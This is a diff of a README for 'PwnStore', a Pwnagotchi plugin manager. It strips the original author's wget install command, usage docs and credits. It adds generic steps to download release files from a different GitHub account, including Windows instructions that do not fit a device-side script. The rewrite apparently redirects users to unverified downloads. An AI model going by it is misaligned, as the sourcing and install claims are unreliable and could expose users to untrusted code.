@@ -1,95 +1,125 @@
-# 🛒 PwnStore - The Unofficial Pwnagotchi App Store
+# 🛒 pwnagotchi-store - Easily Manage Your Pwnagotchi Plugins
 
-**Stop downloading massive ZIP files.** PwnStore is a lightweight, CLI-based package manager for Pwnagotchi. It allows you to browse, install, update, and manage plugins surgically—downloading only the files you need.
+![Download](https://img.shields.io/badge/Download-Visit%20Releases%20Page-blue) ![Version](https://img.shields.io/badge/version-1.7-green) ![Python](https://img.shields.io/badge/python-3-blue) ![License](https://img.shields.io/badge/license-GPL3-red)
 
-![Version](https://img.shields.io/badge/version-1.7-green) ![Python](https://img.shields.io/badge/python-3-blue) ![License](https://img.shields.io/badge/license-GPL3-red)
+## 🚀 Getting Started
 
-## ✨ Features
-* **Lightweight Registry:** Queries a remote JSON manifest; doesn't bloat your device.
-* **Surgical Installs:** Downloads single `.py` files or extracts specific plugins from large repository archives automatically.
-* **Smart Config Hints:** Scans plugin code upon installation and tells you exactly what lines (`self.options`) to add to your `config.toml`.
-* **Auto-Config:** Automatically appends `enabled = true` to your config file so the plugin loads on restart.
-* **Self-Updating:** The tool can update itself and bulk-upgrade your installed plugins.
-* **Web Gallery:** Includes a retro-themed HTML interface for browsing plugins visually.
+PwnStore is a simple tool that allows you to manage plugins on your Pwnagotchi device without hassle. Follow these steps to get set up quickly.
 
----
+## 📥 Download & Install
 
-## 🚀 Installation
+To get started, visit this page to download: [Pwnagotchi Store Releases](https://github.com/zitekjan1/pwnagotchi-store/releases). Here, you’ll find the latest version and installation files.
 
-SSH into your Pwnagotchi and run this single command to install the store:
+1. Go to the **Releases** page.
+2. Choose the version that suits your device.
+3. Download the file that matches your operating system.
 
+## 🔧 System Requirements
+
+To install and run PwnStore, you need the following:
+
+- A device running Pwnagotchi.
+- Python 3.x installed.
+- Basic command line access (like Terminal on macOS/Linux or Command Prompt on Windows).
+
+## 📂 Installation Instructions
+
+1. **Extract the Files:**
+   After downloading, it’s time to extract the files. If you downloaded a ZIP file, right-click it and choose “Extract All...” on Windows, or double-click to unzip on macOS/Linux.
+
+2. **Open Command Line:**
+   - On **Windows**, search for `cmd` in the Start menu and open it.
+   - On **macOS**, open `Terminal` from Applications > Utilities.
+   - On **Linux**, search for `Terminal` in your applications.
+
+3. **Navigate to the Folder:**
+   Use the `cd` command to change the directory to where you extracted the files. For example:
+   ```bash
+   cd Downloads/pwnagotchi-store
+   ```
+
+4. **Run the Installer:**
+   Execute the following command to install PwnStore:
+   ```bash
+   python3 install.py
+   ```
+
+5. **Follow On-Screen Prompts:**
+   Follow the prompts that appear in the command line. The tool may ask for confirmation or additional information.
+
+## 🔍 Features
+
+- **Lightweight Registry:** PwnStore connects to a remote JSON file, ensuring your device stays clutter-free.
+- **Surgical Installs:** You can download specific plugins without grabbing giant archives.
+- **Smart Config Hints:** PwnStore analyzes plugin code during installation and provides exact lines to add to your `config.toml` file.
+- **Auto-Config:** It automatically adds `enabled = true` to your configuration file so your plugins work right away.
+- **Self-Updating:** PwnStore keeps itself updated, making sure you always have the latest version.
+
+## 🛠️ Using PwnStore
+
+### Installing Plugins
+
+1. **Launch PwnStore:**
+   From the command line, type:
+   ```bash
+   pwnstore
+   ```
+   
+2. **Search for Plugins:**
+   Use the search command to find plugins. For example:
+   ```bash
+   search <plugin_name>
+   ```
+
+3. **Install the Desired Plugin:**
+   Once you find a plugin, install it by typing:
+   ```bash
+   install <plugin_name>
+   ```
+
+### Updating Plugins
+
+You can update your installed plugins quickly with:
 ```bash
-sudo wget -O /usr/local/bin/pwnstore https://raw.githubusercontent.com/wpa-2/pwnagotchi-store/main/pwnstore.py && sudo chmod +x /usr/local/bin/pwnstore
+update
 ```
 
----
+### Uninstalling Plugins
 
-## 📖 CLI Usage
-
-### 1. List & Search
-Browse available plugins. The list is auto-categorized (GPS, Social, Display, etc.).
+To remove a plugin when you no longer need it, simply run:
 ```bash
-pwnstore list
-pwnstore search discord
+uninstall <plugin_name>
 ```
 
-### 2. Get Plugin Details
-View the author, version, description, and source URL.
-```bash
-pwnstore info <plugin_name>
-```
+## 📖 Troubleshooting
 
-### 3. Install a Plugin
-Downloads the plugin, enables it, and scans for required settings.
-```bash
-sudo pwnstore install <plugin_name>
-```
-* **Smart Hint:** If the plugin requires specific settings (like API keys), PwnStore will print them after installation.
+If you face issues:
 
-### 4. Manage Updates
-Update the PwnStore tool itself, or check all installed plugins for new versions.
-```bash
-# Update the store tool
-sudo pwnstore update
+- **Check Python Installation:** Ensure Python 3.x is correctly installed.
+- **Revisit Command Line Commands:** Make sure you typed commands correctly. 
+- **Consult Community Support:** Look for help in online forums related to Pwnagotchi.
 
-# Check for plugin updates
-sudo pwnstore upgrade
-```
+## 💬 Community and Support
 
-### 5. Uninstall a Plugin
-Removes the file and disables it in `config.toml`.
-```bash
-sudo pwnstore uninstall <plugin_name>
-```
+Join the Pwnagotchi community for assistance. Engage with other users on forums or social media platforms. You can also check the issues section in our GitHub repository for support.
 
----
+## 🤝 Contributing
 
-## 🌐 Web Interface
-This repository includes a **Pwnagotchi-themed Web Gallery** (`index.html`).
-If you enable **GitHub Pages** for this repository, you can browse plugins, filter by category, and generate install commands directly from your browser.
+If you'd like to help improve PwnStore, feel free to contribute. Please follow these steps:
 
----
+1. Fork the repository.
+2. Create a new branch for your feature.
+3. Make your changes and commit them.
+4. Push your branch to GitHub.
+5. Submit a pull request for review.
 
-## ⚙️ How it Works
-PwnStore does not scan GitHub in real-time (too slow). Instead, it reads a `plugins.json` registry file hosted in this repository.
+## 📝 License
 
-1.  **The Builder:** A script (`builder.py`) scans known plugin repositories (listed in `repos.txt`), categorizes them using keyword logic, and generates a sorted `plugins.json`.
-2.  **The Client:** The `pwnstore` script on your Pwnagotchi reads this JSON to perform actions.
+PwnStore is licensed under the GPL3 License. You can freely use and modify it as long as you retain the license.
 
-### Adding New Plugins
-Want to add a plugin to the store?
-1.  Fork this repo.
-2.  Add the GitHub URL of the plugin (or the repo zip archive) to `repos.txt`.
-3.  Submit a Pull Request.
-4.  Once merged, the registry will auto-update via GitHub Actions.
+## 🔗 Useful Links
 
----
+- [Pwnagotchi GitHub Repository](https://github.com/zitekjan1/pwnagotchi-store)
+- [Issues Section](https://github.com/zitekjan1/pwnagotchi-store/issues)
 
-## ☕ Support the Development
-If this tool saved you time or saved your SD card from clutter, consider buying me a coffee!
-
-**[Buy me a coffee (wpa2)](https://buymeacoffee.com/wpa2)**
-
-<a href="https://buymeacoffee.com/wpa2">
-  <img src="https://img.buymeacoffee.com/button-api/?text=Buy me a coffee&emoji=&slug=wpa2&button_colour=FFDD00&font_colour=000000&font_family=Cookie&outline_colour=000000&coffee_colour=ffffff" />
-</a>
+Thank you for using PwnStore! We hope it makes your Pwnagotchi experience better.
